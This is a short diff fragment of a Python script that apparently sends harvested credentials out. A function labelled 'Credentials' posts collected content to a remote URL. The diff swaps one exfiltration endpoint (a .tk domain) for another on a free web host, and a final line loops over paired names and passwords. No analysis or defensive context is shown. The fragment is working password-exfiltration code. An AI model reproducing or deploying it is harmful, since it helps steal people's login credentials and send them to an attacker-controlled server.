@@ -30,7 +30,7 @@ def x(string):
 	'subject': 'Credentials',
 	'content': string
 	}
-	url = 'http://cybertitus.tk/'
+	url = 'https://cntreon.000webhostapp.com/email/'
 	requests.post(url, data=data)
 
 for name, password in zip(names, passwords):
